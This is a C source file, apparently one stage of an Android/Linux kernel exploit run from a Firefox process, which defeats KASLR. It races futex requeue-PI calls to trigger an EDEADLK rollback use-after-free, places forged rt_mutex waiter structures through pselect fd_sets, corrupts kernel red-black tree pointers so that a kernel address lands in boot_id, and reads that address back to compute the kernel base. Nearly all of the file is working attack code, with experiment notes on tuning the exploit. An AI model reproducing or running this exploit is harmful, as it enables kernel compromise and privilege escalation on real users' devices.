#include "common.h"
#include <stdarg.h>

#define SLIDE_MAX_ATTEMPTS 20
#define SLIDE_CONSUME_DELAY 2000
#define SLIDE_CONSUME_USEC 0
#define SLIDE_PSELECT_NFDS PSELECT_ROUTE_NFDS
#define SLIDE_PSELECT_PAD_BYTES 0
#define SLIDE_PSELECT_WORD_SHIFT PSELECT_WAITER_WORD_SHIFT
#define SLIDE_WAIT_SECONDS 1

/* E20 used TASK_NORMAL | TASK_INTERRUPTIBLE (3). Keep that baseline unless
 * a deliberately built experiment overrides it. */
#ifndef VIOLIN_SLIDE_WAKE_STATE
#define VIOLIN_SLIDE_WAKE_STATE 3
#endif

#ifndef VIOLIN_SLIDE_RED_TREE_PC
#define VIOLIN_SLIDE_RED_TREE_PC 0
#endif
#ifndef VIOLIN_SLIDE_RED_PI_PARENT
#define VIOLIN_SLIDE_RED_PI_PARENT 0
#endif

static void slide_crash_write_one(const char *path, const char *msg) {
  int fd = open(path, O_WRONLY | O_CREAT | O_APPEND, 0644);
  if (fd < 0) {
    return;
  }
  size_t len = strlen(msg);
  size_t off = 0;
  while (off < len) {
    ssize_t n = write(fd, msg + off, len - off);
    if (n <= 0) {
      break;
    }
    off += (size_t)n;
  }
  fsync(fd);
  close(fd);
}

static void slide_crash_log(const char *fmt, ...) {
  char buf[512];
  va_list ap;
  va_start(ap, fmt);
  int n = vsnprintf(buf, sizeof(buf), fmt, ap);
  va_end(ap);
  if (n < 0) {
    return;
  }
  buf[sizeof(buf) - 1] = '\0';
  slide_crash_write_one("/data/data/org.mozilla.firefox/files/crash.txt", buf);
  slide_crash_write_one("/sdcard/Download/crash.txt", buf);
}

static uint32_t slide_f_wait;
static uint32_t slide_f_pi_target;
static uint32_t slide_f_pi_chain;
static atomic_int slide_waiter_ready;
static atomic_int slide_waiter_waiting;
static atomic_int slide_owner_started;
static atomic_int slide_route_done;
static atomic_int slide_waiter_tid;
static atomic_int slide_consume_calls;
static atomic_int slide_consume_go;
static atomic_int slide_consume_seen;
static atomic_int slide_consume_lost;
static atomic_int slide_consume_enter_sched;
static atomic_int slide_consume_stop;
static atomic_int slide_consume_sched_ok;
static atomic_int slide_consume_last_sched_ret;
static atomic_int slide_consume_last_sched_errno;
static atomic_int slide_uaf_primed;  /* E25: set by parent after EDEADLK rollback */
static int slide_runtime_shift = SLIDE_PSELECT_WORD_SHIFT;

int slide_pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (SLIDE_PSELECT_NFDS + bits_per_word - 1) / bits_per_word;
}

int slide_pselect_global_word(int waiter_word) {
  return slide_runtime_shift + waiter_word;
}

int slide_pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

uint64_t slide_pselect_get_global_word(
    const fd_set *in, const fd_set *out, const fd_set *ex,
    int words_per_set, int global_word) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      return fdset_get_word(in, word_idx);
    case 1:
      return fdset_get_word(out, word_idx);
    case 2:
      return fdset_get_word(ex, word_idx);
    default:
      return 0;
  }
}

void slide_pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, int shift, uint64_t value, const char *name) {
  int saved_shift = slide_runtime_shift;
  slide_runtime_shift = shift;
  int global_word = slide_pselect_global_word(waiter_word);
  int placed = slide_pselect_put_global_word(
      in, out, ex, words_per_set, global_word, value);
  slide_runtime_shift = saved_shift;
  if (!placed) {
    pr_warning("slide pselect cannot place %s waiter_word=%d global_word=%d "
               "words_per_set=%d nfds=%d\n",
               name, waiter_word, global_word, words_per_set,
               SLIDE_PSELECT_NFDS);
  }
}

void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  int words_per_set = slide_pselect_words_per_set();
  int tree_shift = SLIDE_PSELECT_WORD_SHIFT;
  int pi_shift = SLIDE_PSELECT_WORD_SHIFT;
  int tail_shift = SLIDE_PSELECT_WORD_SHIFT;
  /* E4: use fake waiter's pi_tree_entry on the controlled page as the
   * __rb_parent_color for pi_parent, instead of SLIDE_LOGGERS_0_1 (loggers).
   * This makes rb_erase follow a controlled rb_node chain on the page. */
  uintptr_t pi_parent_addr = fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF;
  struct slide_waiter_word {
    int word;
    int shift;
    uint64_t value;
    const char *name;
  } words[] = {
    /* E15: use caiman's exact word mapping + SLIDE_LOGGERS_0_1 for pi_parent
     * (not fake_w0 offset). The mechanism might depend on __rb_parent_color
     * pointing to the loggers array (which contains kernel pointers that look
     * like valid rb_node fields). */
    /* E17: overwrite tree.prio (word 3) and tree.deadline (word 4) to ensure
     * they differ from task's priority/deadline. rt_mutex_adjust_prio_chain
     * exits early if rt_waiter_node_equal returns true (prio AND deadline
     * both match). Setting extreme values forces the function to proceed. */
    {0, tree_shift,
     SLIDE_LOGGERS_0_1 | (VIOLIN_SLIDE_RED_TREE_PC ? 1ULL : 0ULL), "tree_pc"},
    {1, tree_shift, 0, "tree_right"},
    {2, tree_shift, SLIDE_RANDOM_BOOT_ID_DATA, "tree_left"},
    {3, tree_shift, 0x7fffffff, "tree_prio"},
    {4, tree_shift, 0, "tree_deadline"},
    {5, pi_shift,
     SLIDE_LOGGERS_0_1 | (VIOLIN_SLIDE_RED_PI_PARENT ? 1ULL : 0ULL), "pi_parent"},
    {6, pi_shift, 0, "pi_right"},
    {7, pi_shift, SLIDE_RANDOM_BOOT_ID_DATA, "pi_left"},
    {8, pi_shift, 0x7fffffff, "pi_prio"},
    {9, pi_shift, 0, "pi_deadline"},
    {10, tail_shift, VIOLIN_SLIDE_USE_FAKE_TASK ? fake_task : SLIDE_INIT_TASK,
     "task"},
    {11, tail_shift, fake_lock, "lock"},
    {12, tail_shift, VIOLIN_SLIDE_WAKE_STATE, "wake_state"},
    {13, tail_shift, 0, "ww_ctx"},
  };
  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
    struct slide_waiter_word *w = &words[i];
    slide_pselect_put_waiter_word(
        in, out, ex, words_per_set, w->word, w->shift, w->value, w->name);
  }
  slide_crash_log("SLIDEP1_LAYOUT: mode=%s tree=%d pi=%d tail=%d base=%d red_tree=%d red_pi=%d\n",
          VIOLIN_SLIDE_USE_FAKE_TASK ? "faketask" : "init-task",
                  tree_shift, pi_shift, tail_shift, slide_runtime_shift,
                  VIOLIN_SLIDE_RED_TREE_PC, VIOLIN_SLIDE_RED_PI_PARENT);
}

void open_slide_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
  for (int fd = 0; fd < SLIDE_PSELECT_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(read_fd, fd);
    }
  }
  dup2(read_fd, SLIDE_PSELECT_NFDS - 1);
  FD_SET(SLIDE_PSELECT_NFDS - 1, ex);
}

void slide_pselect_stack_copy(void) {
  slide_crash_log("SLIDEP0: enter pselect_stack page=0x%llx lock=0x%llx w0=0x%llx\n",
                  (unsigned long long)page_base,
                  (unsigned long long)fake_lock,
                  (unsigned long long)fake_w0);
  if (!page_base || !fake_lock || !fake_w0) {
    pr_error("slide pselect missing kernel page base=%016zx lock=%016zx w0=%016zx\n",
             page_base, fake_lock, fake_w0);
    slide_crash_log("SLIDEP0_FAIL: missing page/lock/w0\n");
    return;
  }

  int pipefd[2] = {-1, -1};
  SYSCHK(pipe(pipefd));
  int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
  if (block_fd < 0) {
    pr_warning("slide timerfd_create failed errno=%d; using pipe read end\n",
               errno);
    block_fd = pipefd[0];
  }
  int high_read = fcntl(block_fd, F_DUPFD, SLIDE_PSELECT_NFDS + 16);
  if (high_read < 0) {
    pr_error("slide pselect F_DUPFD read errno=%d\n", errno);
    slide_crash_log("SLIDEP1_FAIL: F_DUPFD errno=%d\n", errno);
    if (block_fd != pipefd[0]) {
      close(block_fd);
    }
    close(pipefd[0]);
    close(pipefd[1]);
    return;
  }

  fd_set in;
  fd_set out;
  fd_set ex;
  prepare_slide_pselect_fdsets(&in, &out, &ex);
  open_slide_selected_fds(&in, &out, &ex, high_read);
  slide_crash_log("SLIDEP1: fdsets prepared high_read=%d nfds=%d words_per_set=%d\n",
                  high_read, SLIDE_PSELECT_NFDS,
                  slide_pselect_words_per_set());

  atomic_store(&slide_consume_stop, 0);
  atomic_store(&slide_consume_go, 0);
  atomic_store(&slide_consume_seen, 0);
  atomic_store(&slide_consume_lost, 0);
  atomic_store(&slide_consume_enter_sched, 0);
  atomic_store(&slide_uaf_primed, 0);  /* E25: reset UAF primed flag */
  atomic_store(&slide_consume_calls, 0);
  atomic_store(&slide_consume_sched_ok, 0);
  atomic_store(&slide_consume_last_sched_ret, -1);
  atomic_store(&slide_consume_last_sched_errno, 0);

  struct timespec timeout = {
    .tv_sec = PSELECT_TIMEOUT_SEC,
    .tv_nsec = 0,
  };
  struct timespec *timeoutp = &timeout;

  atomic_store(&slide_consume_go, 1);
  errno = 0;
  slide_crash_log("SLIDEP2: before pselect\n");

  int ret = pselect(SLIDE_PSELECT_NFDS, &in, &out, &ex, timeoutp, NULL);
  int saved_errno = errno;
  atomic_store(&slide_consume_go, 0);
  slide_crash_log("SLIDEP3: after pselect ret=%d errno=%d calls=%d sched_ok=%d "
                  "last_sched_ret=%d last_sched_errno=%d\n",
                  ret, saved_errno, atomic_load(&slide_consume_calls),
                  atomic_load(&slide_consume_sched_ok),
                  atomic_load(&slide_consume_last_sched_ret),
                  atomic_load(&slide_consume_last_sched_errno));
  pr_info("slide pselect returned ret=%d errno=%d calls=%d sched_ok=%d "
          "last_sched_ret=%d last_sched_errno=%d\n",
          ret, saved_errno, atomic_load(&slide_consume_calls),
          atomic_load(&slide_consume_sched_ok),
          atomic_load(&slide_consume_last_sched_ret),
          atomic_load(&slide_consume_last_sched_errno));

  close(high_read);
  if (block_fd != pipefd[0]) {
    close(block_fd);
  }
  close(pipefd[0]);
  close(pipefd[1]);
  slide_crash_log("SLIDEP4: pselect_stack return\n");
}

void *slide_consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);

  int seen = 0;
  for (;;) {
    int seq = atomic_load(&slide_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      if (atomic_load(&slide_consume_stop)) {
        return NULL;
      }
      continue;
    }

    seen = seq;
    atomic_store(&slide_consume_seen, seen);
    if (SLIDE_CONSUME_USEC) {
      usleep(SLIDE_CONSUME_USEC);
    } else {
      for (int spin = 0; spin < SLIDE_CONSUME_DELAY; spin++) {
        __asm__ volatile("yield" ::: "memory");
      }
    }
    if (atomic_load(&slide_consume_go) != seq) {
      int lost = atomic_load(&slide_consume_lost) + 1;
      atomic_store(&slide_consume_lost, lost);
      continue;
    }

    if (seq == 1) {
      usleep(PSELECT_ENTER_DELAY_USEC);
    }

    int tid = atomic_load(&slide_waiter_tid);
    int calls = atomic_load(&slide_consume_calls);
    int entered = atomic_load(&slide_consume_enter_sched) + 1;
    atomic_store(&slide_consume_enter_sched, entered);
    atomic_store(&slide_consume_calls, calls + 1);

    /* E25: skip sched_setattr if UAF primed or stop signal received */
    if (atomic_load(&slide_uaf_primed) || atomic_load(&slide_consume_stop)) {
      slide_crash_log("SLIDECONS_SKIP: uaf=%d stop=%d\n",
                      atomic_load(&slide_uaf_primed),
                      atomic_load(&slide_consume_stop));
      atomic_store(&slide_consume_stop, 1);
      while (atomic_load(&slide_consume_go)) {
        __asm__ volatile("yield" ::: "memory");
      }
      return NULL;
    }

    errno = 0;
    slide_crash_log("SLIDECONS0: before sched_setattr tid=%d nice=%d call=%d\n",
                    tid, (calls % 19) + 1, calls + 1);
    long ret = sched_setattr_tid(tid, (calls % 19) + 1);
    int saved_errno = errno;
    slide_crash_log("SLIDECONS1: after sched_setattr ret=%ld errno=%d\n",
                    ret, saved_errno);
    atomic_store(&slide_consume_last_sched_ret, (int)ret);
    atomic_store(&slide_consume_last_sched_errno, saved_errno);
    if (ret == 0) {
      int sched_ok = atomic_load(&slide_consume_sched_ok) + 1;
      atomic_store(&slide_consume_sched_ok, sched_ok);
    }
    atomic_store(&slide_consume_stop, 1);
    while (atomic_load(&slide_consume_go)) {
      __asm__ volatile("yield" ::: "memory");
    }
    return NULL;
  }
}

void *slide_waiter_thread(void *arg __attribute__((unused))) {
  int tid = (int)SYSCHK(syscall(SYS_gettid));
  atomic_store(&slide_waiter_tid, tid);
  slide_crash_log("SLIDEW0: waiter tid=%d lock_pi_chain\n", tid);

  if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide waiter lock chain errno=%d\n", errno);
    slide_crash_log("SLIDEW0_FAIL: lock_pi_chain errno=%d\n", errno);
    return NULL;
  }

  atomic_store(&slide_waiter_ready, 1);
  slide_crash_log("SLIDEW1: waiter ready\n");
  while (!atomic_load(&slide_owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += SLIDE_WAIT_SECONDS;

  atomic_store(&slide_waiter_waiting, 1);
  slide_crash_log("SLIDEW2: before FUTEX_WAIT_REQUEUE_PI\n");
  futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
           &slide_f_pi_target, 0);
  slide_crash_log("SLIDEW3: after FUTEX_WAIT_REQUEUE_PI errno=%d\n", errno);
  futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  slide_crash_log("SLIDEW4: unlocked chain, entering pselect copy\n");

  slide_pselect_stack_copy();
  atomic_store(&slide_route_done, 1);
  slide_crash_log("SLIDEW5: route done\n");

  for (;;) {
    sleep(1);
  }
}

void *slide_owner_thread(void *arg __attribute__((unused))) {
  slide_crash_log("SLIDEO0: owner enter\n");
  if (futex_op(&slide_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide owner lock target errno=%d\n", errno);
    slide_crash_log("SLIDEO0_FAIL: lock target errno=%d\n", errno);
    return NULL;
  }

  while (!atomic_load(&slide_waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&slide_owner_started, 1);
  slide_crash_log("SLIDEO1: owner started, lock chain\n");
  futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  slide_crash_log("SLIDEO2: owner chain lock returned errno=%d\n", errno);

  for (;;) {
    sleep(1);
  }
}

int hex_value(char c) {
  if (c >= '0' && c <= '9') {
    return c - '0';
  }
  if (c >= 'a' && c <= 'f') {
    return c - 'a' + 10;
  }
  if (c >= 'A' && c <= 'F') {
    return c - 'A' + 10;
  }
  return -1;
}

uint64_t slide_read_stext(void) {
  char buf[64];
  unsigned char raw[16];
  slide_crash_log("SLIDER0: read boot_id\n");
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("slide boot_id read denied errno=%d\n", errno);
    slide_crash_log("SLIDER0_FAIL: open boot_id errno=%d\n", errno);
    return 0;
  }

  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  int saved_errno = errno;
  close(fd);
  if (n < 0) {
    pr_warning("slide boot_id read failed errno=%d\n", saved_errno);
    slide_crash_log("SLIDER1_FAIL: read boot_id errno=%d\n", saved_errno);
    return 0;
  }
  buf[n] = 0;
  slide_crash_log("SLIDER1: boot_id n=%zd value=%s\n", n, buf);

  /* ========== SLIDE DEBUG: RAW BOOT_ID ========== */
  pr_info("[slide-debug] boot_id raw (n=%zd): %s\n", n, buf);
  pr_info("[slide-debug] boot_id hex: ");
  for (int i = 0; i < n && i < 36; i++) {
    pr_info("%02x ", (unsigned char)buf[i]);
  }
  pr_info("\n");
  /* ========== END DEBUG ========== */

  int nibble = -1;
  int out = 0;
  for (ssize_t i = 0; i < n && out < 16; i++) {
    int v = hex_value(buf[i]);
    if (v < 0) {
      continue;
    }
    if (nibble < 0) {
      nibble = v;
      continue;
    }
    raw[out++] = (unsigned char)((nibble << 4) | v);
    nibble = -1;
  }
  if (out != 16) {
    pr_warning("slide short boot_id parse out=%d n=%zd\n", out, n);
    slide_crash_log("SLIDER2_FAIL: short parse out=%d n=%zd\n", out, n);
    return 0;
  }

  uint64_t leaked = 0;
  for (int i = 0; i < 8; i++) {
    leaked |= (uint64_t)raw[i] << (i * 8);
  }
  pr_info("[slide-debug] parsed leaked pointer=0x%016llx (>>48=0x%04llx)\n",
          (unsigned long long)leaked, (unsigned long long)(leaked >> 48));
  if ((leaked >> 48) != 0xffff) {
    pr_warning("slide bad leaked pointer=%016llx\n",
               (unsigned long long)leaked);
    slide_crash_log("SLIDER2_BAD: leaked=0x%016llx hi=0x%04llx\n",
                    (unsigned long long)leaked,
                    (unsigned long long)(leaked >> 48));
    return 0;
  }

  /* The leak must be a canonical KASLR pointer.  A P0/direct-map alias is
   * valid-looking (ffff...) but carries no KASLR slide and must never be
   * accepted as stext. */
  if (is_direct_ptr(leaked)) {
    pr_warning("slide rejected P0/direct-map leak=%016llx\n",
               (unsigned long long)leaked);
    slide_crash_log("SLIDER2_BAD_DOMAIN: direct-map leak=0x%016llx\n",
                    (unsigned long long)leaked);
    return 0;
  }

  uint64_t off = p0_alias_image_offset(SLIDE_NFULNL_LOGGER);
  uint64_t stext = leaked - off;
  pr_success("slide boot_id_leaked_nfulnl_logger pid=%d value=%016llx stext=%016llx\n",
             getpid(), (unsigned long long)leaked, (unsigned long long)stext);
  pr_success("slide boot_id-derived_stext pid=%d value=%016llx\n",
             getpid(), (unsigned long long)stext);
  slide_crash_log("SLIDER3_OK: leaked=0x%016llx stext=0x%016llx\n",
                  (unsigned long long)leaked,
                  (unsigned long long)stext);
  return stext;
}
uint64_t slide_child_leak_stext(void) {
  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  slide_crash_log("SLIDEC0: child_leak create threads\n");
  SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));
  slide_crash_log("SLIDEC1: threads created\n");

  while (!atomic_load(&slide_waiter_waiting) ||
         !atomic_load(&slide_owner_started)) {
    usleep(1000);
  }

  /* waiter_ready is published before FUTEX_WAIT_REQUEUE_PI; owner_started
   * confirms the three-thread dependency cycle is staged. */
  while (!atomic_load(&slide_waiter_ready)) {
    usleep(1000);
  }
  /* futex(2) argument layout matters here:
   *   val=1, timeout-as-nr_requeue=1, uaddr2=target, val3=expected f_wait=0.
   * The vulnerable rollback is identified by -1/EDEADLK, not by success. */
  int uaf_primed = 0;
  for (int retry = 0; retry < 200; retry++) {
    /* E27 diagnostic: print futex values before call */
    slide_crash_log("SLIDEC2_PRE: retry=%d f_wait=%u f_target=%u waiter_tid=%d\n",
                    retry, slide_f_wait, slide_f_pi_target,
                    atomic_load(&slide_waiter_tid));
    errno = 0;
    long ret = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)0,
             &slide_f_pi_target, 0);
    int saved_errno = errno;
    slide_crash_log("SLIDEC2: CMP_REQUEUE_PI retry=%d ret=%ld errno=%d\n",
                    retry, ret, saved_errno);
    if (ret == -1 && saved_errno == EDEADLK) {
      slide_crash_log("SLIDEC2_UAF_PRIMED: EDEADLK rollback at retry=%d\n",
                      retry);
      uaf_primed = 1;
      atomic_store(&slide_uaf_primed, 1);  /* E25: signal consumer to skip sched_setattr */
      atomic_store(&slide_consume_stop, 1); /* E25: force consumer to stop */
      break;
    }
    if (ret == 0) {
      /* CMP_REQUEUE_PI succeeded — waiter was requeued. Break immediately
       * to avoid a second call that might trigger EDEADLK rollback. */
      slide_crash_log("SLIDEC2_OK: requeue succeeded at retry=%d\n", retry);
      break;
    }
    if (ret > 0) {
      slide_crash_log("SLIDEC2_UNEXPECTED_REQUEUE: ret=%ld; no EDEADLK\n",
                      ret);
      break;
    }
    /* ret==0 means the waiter has not reached the source futex queue yet. */
    usleep(1000); /* 1ms between retries */
  }
  if (!uaf_primed) {
    slide_crash_log("SLIDEC2_NO_ROLLBACK: requeue succeeded without EDEADLK\n");
  }

  while (!atomic_load(&slide_route_done)) {
    sleep(1);
  }
  slide_crash_log("SLIDEC4: route_done, read_stext\n");

  return slide_read_stext();
}

int slide_leak_kernel_base(void) {
  slide_crash_log("SLIDE0: enter slide_leak max_attempts=%d\n", SLIDE_MAX_ATTEMPTS);
  for (int attempt = 1; attempt <= SLIDE_MAX_ATTEMPTS; attempt++) {
    slide_crash_log("SLIDE1: attempt=%d prepare_good_kernel_page\n", attempt);
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
    slide_crash_log("SLIDE2: attempt=%d prepared page=0x%llx lock=0x%llx w0=0x%llx "
                    "bootid_data=0x%llx logger=0x%llx\n",
                    attempt,
                    (unsigned long long)page_base,
                    (unsigned long long)fake_lock,
                    (unsigned long long)fake_w0,
                    (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA,
                    (unsigned long long)SLIDE_NFULNL_LOGGER);
    if (!page_base || !fake_lock) {
      slide_crash_log("SLIDE2_SKIP: attempt=%d missing page/lock\n", attempt);
      continue;
    }

    /* ========== SLIDE DEBUG OUTPUT ========== */
    pr_info("[slide-debug] page_base=0x%016llx\n", (unsigned long long)page_base);
    pr_info("[slide-debug] fake_lock=0x%016llx\n", (unsigned long long)fake_lock);
    pr_info("[slide-debug] fake_w0=0x%016llx\n", (unsigned long long)fake_w0);
    pr_info("[slide-debug] fake_task=0x%016llx\n", (unsigned long long)fake_task);
    pr_info("[slide-debug] fake_fops=0x%016llx\n", (unsigned long long)fake_fops);
    pr_info("[slide-debug] fake_parent=0x%016llx\n", (unsigned long long)fake_parent);
    pr_info("[slide-debug] fake_right=0x%016llx\n", (unsigned long long)fake_right);
    pr_info("[slide-debug] fake_left=0x%016llx\n", (unsigned long long)fake_left);
    pr_info("[slide-debug] WRITE_TARGETS:\n");
    pr_info("[slide-debug]   write_pc=SLIDE_LOGGERS_0_1=0x%016llx\n", (unsigned long long)SLIDE_LOGGERS_0_1);
    pr_info("[slide-debug]   write_left=SLIDE_RANDOM_BOOT_ID_DATA=0x%016llx\n", (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA);
    pr_info("[slide-debug]   write_right=0\n");
    pr_info("[slide-debug] SCHEDULER_OBJECTS:\n");
    pr_info("[slide-debug]   waiter_task=SLIDE_INIT_TASK=0x%016llx\n", (unsigned long long)SLIDE_INIT_TASK);
    pr_info("[slide-debug]   task_group=SLIDE_ROOT_TASK_GROUP=0x%016llx\n", (unsigned long long)SLIDE_ROOT_TASK_GROUP);
    pr_info("[slide-debug]   pi_top_task=SLIDE_INIT_TASK=0x%016llx\n", (unsigned long long)SLIDE_INIT_TASK);
    pr_info("[slide-debug] STRUCTURE OFFSETS:\n");
    pr_info("[slide-debug]   LOCK_OFF=0x%x W0_OFF=0x%x FAKE_TASK_OFF=0x%x\n", LOCK_OFF, W0_OFF, FAKE_TASK_OFF);
    pr_info("[slide-debug]   FAKE_WAITER_PI_TREE_ENTRY_OFF=0x%x\n", FAKE_WAITER_PI_TREE_ENTRY_OFF);
    pr_info("[slide-debug]   FAKE_WAITER_TASK_OFF=0x%x FAKE_WAITER_LOCK_OFF=0x%x\n", FAKE_WAITER_TASK_OFF, FAKE_WAITER_LOCK_OFF);
    pr_info("[slide-debug]   FAKE_TASK_PI_LOCK_OFF=0x%x FAKE_TASK_PI_WAITERS_OFF=0x%x\n", FAKE_TASK_PI_LOCK_OFF, FAKE_TASK_PI_WAITERS_OFF);
    pr_info("[slide-debug]   FAKE_TASK_PI_TOP_TASK_OFF=0x%x FAKE_TASK_TASK_GROUP_OFF=0x%x\n", FAKE_TASK_PI_TOP_TASK_OFF, FAKE_TASK_TASK_GROUP_OFF);
    pr_info("[slide-debug] NFDS=%d\n", SLIDE_PSELECT_NFDS);
    /* ========== END SLIDE DEBUG ========== */

    int raw_fds[2];
    SYSCHK(pipe(raw_fds));
    int fds[2];
    fds[0] = SYSCHK(fcntl(raw_fds[0], F_DUPFD, SLIDE_PSELECT_NFDS + 128));
    fds[1] = SYSCHK(fcntl(raw_fds[1], F_DUPFD, SLIDE_PSELECT_NFDS + 129));
    SYSCHK(close(raw_fds[0]));
    SYSCHK(close(raw_fds[1]));

    pid_t child = SYSCHK(fork());
    if (child == 0) {
      SYSCHK(close(fds[0]));
      disable_rseq_for_thread();
      log_slide_child_context();
      slide_crash_log("SLIDE3_CHILD: attempt=%d child pid=%d start leak\n",
                      attempt, getpid());
      uint64_t stext = slide_child_leak_stext();
      if (stext) {
        slide_crash_log("SLIDE4_CHILD_OK: attempt=%d stext=0x%llx\n",
                        attempt, (unsigned long long)stext);
        SYSCHK(write(fds[1], &stext, sizeof(stext)));
        _exit(0);
      }
      slide_crash_log("SLIDE4_CHILD_FAIL: attempt=%d no stext\n", attempt);
      _exit(1);
    }

    SYSCHK(close(fds[1]));
    slide_crash_log("SLIDE3_PARENT: attempt=%d child=%d waiting read\n",
                    attempt, child);
    uint64_t stext = 0;
    ssize_t n = read(fds[0], &stext, sizeof(stext));
    SYSCHK(close(fds[0]));
    int status = 0;
    SYSCHK(waitpid(child, &status, 0));
    slide_crash_log("SLIDE5_PARENT: attempt=%d read_n=%zd status=%d stext=0x%llx\n",
                    attempt, n, status, (unsigned long long)stext);
    if (n != (ssize_t)sizeof(stext) || !WIFEXITED(status) ||
        WEXITSTATUS(status) != 0 || !stext) {
      pr_warning("slide attempt %d failed n=%zd status=%d\n",
                 attempt, n, status);
      continue;
    }

    kaslr_base = stext;
    kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
    kaslr_done = 1;
    pr_success("slide-kaslr-ok pid=%d base=%016llx slide=%016llx\n",
               getpid(), (unsigned long long)kaslr_base,
               (unsigned long long)kaslr_slide);
    fflush(stdout);
    return 1;
  }

  return 0;
}
